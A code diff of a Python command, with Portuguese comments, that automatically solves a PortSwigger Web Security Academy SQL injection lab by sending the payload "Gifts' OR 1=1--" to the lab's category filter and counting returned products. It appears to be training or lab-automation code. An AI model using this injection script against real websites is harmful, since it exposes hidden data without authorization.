@@ -1,12 +1,8 @@
-"""
-[Bônus] Comando que resolve, de forma automatizada, o lab do PortSwigger
-Web Academy "SQL injection vulnerability in WHERE clause allowing retrieval
-of hidden data" (categoria: SQL injection).
+# comando bonus: resolve sozinho o lab do portswigger "SQL injection
+# vulnerability in WHERE clause allowing retrieval of hidden data"
+# cada pessoa tem sua propria instancia do lab (muda a url toda vez que
+# acessa), entao o comando pede a url da instancia de quem ta usando
 
-Cada aluno recebe sua própria instância temporária do lab (ex.:
-https://0a1b00xx00xx...web-security-academy.net), por isso o comando recebe
-a URL base da instância do próprio usuário — nunca um alvo fixo de terceiros.
-"""
 import requests
 
 from recon import REQUEST_TIMEOUT, ReconError
@@ -14,33 +10,31 @@ from recon import REQUEST_TIMEOUT, ReconError
 PAYLOAD = "Gifts' OR 1=1--"
 
 
-def solve_sqli_lab(base_url: str) -> str:
+def solve_sqli_lab(base_url):
     base_url = base_url.rstrip("/")
-    url = f"{base_url}/filter"
+    url = base_url + "/filter"
 
     try:
         baseline = requests.get(url, params={"category": "Gifts"}, timeout=REQUEST_TIMEOUT)
         exploit = requests.get(url, params={"category": PAYLOAD}, timeout=REQUEST_TIMEOUT)
     except requests.RequestException as exc:
-        raise ReconError(f"Falha ao acessar o lab: {exc}")
+        raise ReconError(f"nao consegui acessar o lab: {exc}")
 
     if not exploit.ok:
-        raise ReconError(f"Lab retornou HTTP {exploit.status_code} para o payload.")
+        raise ReconError(f"lab respondeu HTTP {exploit.status_code} pro payload")
 
-    produtos_antes = baseline.text.count("<h3>")
-    produtos_depois = exploit.text.count("<h3>")
+    # cada produto tem um <h3> com o nome, entao da pra usar como contador
+    antes = baseline.text.count("<h3>")
+    depois = exploit.text.count("<h3>")
 
-    if produtos_depois > produtos_antes:
+    if depois > antes:
         return (
-            "Lab resolvido! A injeção `' OR 1=1--` no parâmetro 'category' "
-            f"fez a query retornar TODOS os produtos ({produtos_depois} itens, "
-            f"contra {produtos_antes} da categoria original), incluindo os "
-            "'unreleased products' que não deveriam ser listados.\n\n"
-            f"Payload usado: category={PAYLOAD}"
+            f"lab resolvido! o payload ' OR 1=1-- fez a query devolver todos os "
+            f"produtos ({depois} contra {antes} da categoria normal), incluindo "
+            f"os que nao deveriam aparecer.\n\npayload: category={PAYLOAD}"
         )
 
     raise ReconError(
-        "Payload não confirmou o bypass (a página não retornou mais produtos "
-        "que o baseline). Verifique se a URL corresponde a essa instância "
-        "específica do lab 'SQL injection... retrieval of hidden data'."
+        "o payload nao aumentou a quantidade de produtos retornados. "
+        "confere se a url e da instancia certa do lab"
     )
